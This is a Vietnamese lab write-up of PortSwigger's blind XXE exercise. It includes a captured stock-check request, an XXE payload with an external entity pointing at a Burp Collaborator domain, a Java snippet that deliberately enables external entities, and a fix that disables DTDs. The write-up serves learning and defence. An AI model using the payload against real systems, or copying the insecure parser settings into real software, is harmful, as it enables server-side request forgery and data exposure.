![](../assets/Pasted%20image%2020261117104926.png)

# 1. Mục tiêu
Bài này là Blind XXE, tức là backend vẫn parse và xử lý XML như thường tuy nhiên không reflect lỗi ra output để có thể đọc được. Mục tiêu là host một server bên ngoài và dùng external entity trỏ tới server đó, để sau này lỗi không reflect tới http response mà gửi thẳng tới attacker server luôn. Bài này dùng Burp Collaborator để host server vì lab đã block kết nối ra mạng bên ngoài để tránh việc lợi dụng lab để gửi request tới các domain ngoài mạng

# 2. Recon

![](../assets/Pasted%20image%2020261117105714.png)
Giống LAB01, vẫn là chức năng Check Stock để kiểm tra hàng tồn kho.
Click vào "Check stock", vào HTTP History trên Burp Suite đọc HTTP Request
```http
POST /product/stock HTTP/2
Host: 0a1b0028037ad033811b0cdf005b00f3.web-security-academy.net
Cookie: session=4u9LaFiR7n3GweJBDwsbkA7gh4qLYgWL
Content-Length: 107
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Content-Type: application/xml
Accept: */*
Origin: https://0a1b0028037ad033811b0cdf005b00f3.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a1b0028037ad033811b0cdf005b00f3.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>2</productId>
<storeId>1</storeId>
</stockCheck>
```
![](../assets/Pasted%20image%2020261117105909.png)

Response trả về số lượng hàng tồn kho của sản phẩm đó.

# 3. Exploit
Sử dụng DTD với external entity trỏ tới địa chỉ Burp Collaborator:
```url
ntkt8dgf2cotbclx54np3m29i0oqcf.oastify.com
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xml_injection [<!ENTITY xxe SYSTEM "http://ntkt8dgf2cotbclx54np3m29i0oqcf.oastify.com/" >]>
<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>
```

![](../assets/Pasted%20image%2020261117110133.png)Response báo lỗi product ID nhưng không trả về nội dung của truy vấn đó![](../assets/Pasted%20image%2020261117110338.png)Burp Collaborator nhận được **2 bản ghi DNS lookup và 1 HTTP request** mang đúng domain payload — chứng tỏ server đã resolve external entity và chủ động gọi ra ngoài. Lệnh XXE đã thực thi, hoàn thành lab.
![](../assets/Pasted%20image%2020261117110613.png)

> **Blind chính xác là gì?** Lỗ hổng vẫn còn nguyên, chỉ khác là response **không trả giá trị entity ra ngoài**. So với regular XXE ở LAB01, nó chỉ khác đúng **một bước cuối — bước build response**; còn cấu hình parser thì giống hệt, và **side-effect (fetch URL) vẫn xảy ra lúc parse**. Chính vì response câm nên ta phải mở một kênh out-of-band (Collaborator) để "nghe" xem server có cắn câu không.

> **Vì sao response báo "XML parsing error" mà vẫn tính là thành công?** Vì request mạng (server fetch tới URL của mình) **xảy ra TRƯỚC**, rồi parser mới thử parse nội dung trả về — mà nội dung đó đâu phải DTD hợp lệ nên nó văng lỗi 400. Side-effect đã xong trước khi lỗi sinh ra, nên lab vẫn giải. Lỗi 400 ở đây là bình thường, đừng thấy nó mà tưởng thất bại.

> **Vì sao bắt buộc dùng Burp Collaborator chứ không tự host VPS?** PortSwigger có "note firewall": lab **chặn mọi tương tác với hệ thống ngoài tùy ý** để tránh bị lợi dụng tấn công bên thứ ba, chỉ chừa riêng Collaborator trong allowlist. Ở đời thật thì tự host VPS/ngrok vẫn hứng được; nhưng trong lab thì không. Lưu ý Collaborator cần **Burp Pro** (bản Community không có): tab Collaborator → Copy to clipboard → dán domain `...oastify.com` vào payload → gửi từ Repeater → Poll now là thấy các dòng DNS + HTTP.
# 4. Mô phỏng backend xử lý
Cấu hình parser vẫn y hệt LAB01 (bật external entity), **side-effect fetch URL vẫn xảy ra**. Khác biệt duy nhất nằm ở bước build response: lần này code trả về một chuỗi cố định, **không** ghép `productId` vào — nên không lộ gì ra ngoài (đây chính là "blind"):

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", true);

Document doc = dbf.newDocumentBuilder().parse(input);   // &xxe; được resolve -> server gọi ra Collaborator Ở ĐÂY
// ... xử lý stock ...
return "\"Invalid product ID\"";                        // chuỗi cố định, KHÔNG chèn productId -> blind
```

# 5. Cách vá
```java
// Tắt DTD -> dập mọi biến thể XXE tận gốc
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

Hạn chế tối đa quyền, loại bỏ tính năng resolve entities và load DTD nếu ứng dụng không dùng tới chức năng đó. Loại bỏ cả việc phản chiếu lại response ra ngoài nếu không cần thiết.